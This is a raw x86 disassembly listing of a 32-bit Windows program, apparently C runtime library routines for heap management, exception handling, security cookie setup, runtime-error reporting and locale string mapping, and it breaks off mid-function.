  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
